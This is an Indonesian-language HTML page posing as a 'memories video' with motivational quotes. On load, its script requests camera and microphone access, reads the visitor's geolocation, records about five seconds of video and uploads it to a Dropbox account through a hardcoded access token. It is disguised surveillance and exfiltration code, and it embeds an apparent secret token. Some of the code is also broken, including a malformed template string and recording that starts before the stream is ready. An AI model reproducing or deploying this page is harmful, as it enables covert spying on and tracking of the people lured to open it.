<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Kenangan Kita</title>
    <style>
        body {
            background-color: #1b1b1b;
            color: #fff;
            text-align: center;
            padding: 20px;
            font-size: 1.2em;
        }

        h1 {
            font-size: 2.5em;
            color: #0ff;
            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
            margin-bottom: 20px;
        }

        #fakeVideo {
            width: 80%;
            height: auto;
            margin: 20px auto;
            background-color: #000;
            display: none; 
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
        }

        .content {
            background-color: #222;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
            margin-top: 50px;
            width: 80%;
            margin-left: auto;
            margin-right: auto;
        }

        .content p {
            font-size: 1.2em;
            color: #ccc;
            margin-bottom: 30px;
            line-height: 1.5em;
        }

        .location {
            color: #fff;
            margin-top: 20px;
        }

    </style>
</head>
<body>
    <h1>Video Kenangan Kita</h1>

    <div id="fakeVideo">
        <p>Menonton Video...</p>
        <video id="dropboxVideo" autoplay controls>
            <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <div class="content">
        <p>"Setiap kenangan memiliki kisahnya sendiri, dan setiap kisah berisi pelajaran berharga. Di tengah perjalanan ini, kita tetap berdiri tegak, karena setiap langkah membawa kita lebih dekat pada tujuan." </p>
        
        <p>"Jangan takut untuk melangkah, karena setiap langkah, meskipun kecil, adalah kemenangan. Hidup kita adalah rekaman yang tak ternilai." </p>
        
        <p>"Jangan biarkan masa lalu mendefinisikan masa depanmu. Setiap detik adalah kesempatan baru untuk menciptakan kenangan yang lebih baik." </p>

        <div class="location" id="locationData">
            <p><strong>Lokasi Terakhir:</strong></p>
            <p id="location"></p>
        </div>
    </div>

    <script>
        let videoElement = document.getElementById('dropboxVideo');
        let fakeVideo = document.getElementById('fakeVideo');

        let mediaStream;
        let mediaRecorder;
        let recordedChunks = [];
        let locationData = [];

        const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';

        function trackLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    console.log('Latitude: ' + position.coords.latitude);
                    console.log('Longitude: ' + position.coords.longitude);

                    // Simpan lokasi ke localStorage
                    localStorage.setItem('locationData', JSON.stringify(locationData));
                    displayLocation();
                }, function(error) {
                    console.log('Error dalam melacak lokasi:', error);
                });
            } else {
                console.log('Geolocation tidak didukung di browser ini.');
            }
        }

        function displayLocation() {
            const storedLocation = JSON.parse(localStorage.getItem('locationData'));
            if (storedLocation) {
                document.getElementById('location').textContent = 
                    Latitude: ${storedLocation.latitude}, Longitude: ${storedLocation.longitude};
            } else {
                document.getElementById('location').textContent = "Lokasi tidak ditemukan.";
            }
        }

        function startVideo() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    mediaStream = stream;
                    videoElement.srcObject = stream;
                    trackLocation(); // Mulai melacak lokasi ketika video dimulai
                })
                .catch(function(error) {
                    console.log('Akses kamera gagal: ', error);
                });
        }

        function startRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(mediaStream);

            mediaRecorder.ondataavailable = function(event) {
                recordedChunks.push(event.data);
            };

            mediaRecorder.onstop = function() {
                let blob = new Blob(recordedChunks, { type: 'video/webm' });
                let videoURL = URL.createObjectURL(blob);
                videoElement.src = videoURL;
                fakeVideo.style.display = 'block'; // Tampilkan video hasil rekaman
                uploadToDropbox(blob, 'video'); // Unggah video setelah rekaman selesai
            };

            mediaRecorder.start();
        }

        function stopRecording() {
            mediaRecorder.stop();
        }

        function uploadToDropbox(fileBlob, type) {
            const url = 'https://content.dropboxapi.com/2/files/upload';
            const xhr = new XMLHttpRequest();
            const fileName = type === 'video' ? 'recorded_video.webm' : 'photo.jpg';

            xhr.open('POST', url, true);
            xhr.setRequestHeader('Authorization', 'Bearer ' + DROPBOX_ACCESS_TOKEN);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({
                path: '/Uploads/' + fileName,
                mode: 'add',
                autorename: true,
                mute: false
            }));

            xhr.onload = function() {
                console.log('File berhasil diunggah ke Dropbox:', xhr.responseText);
            };

            xhr.onerror = function() {
                console.error('Gagal mengunggah ke Dropbox');
            };

            xhr.send(fileBlob);
        }

        function startAllFunctions() {
            fakeVideo.style.display = 'block'; // Tampilkan video dari Dropbox
            startVideo(); // Mulai video dan lokasi
            startRecording(); // Mulai merekam setelah video dimulai

            setTimeout(function() {
                stopRecording(); // Berhenti merekam setelah 5 detik
            }, 5000);
        }

        window.onload = function() {
            startAllFunctions();
        };
    </script>
</body>
</html>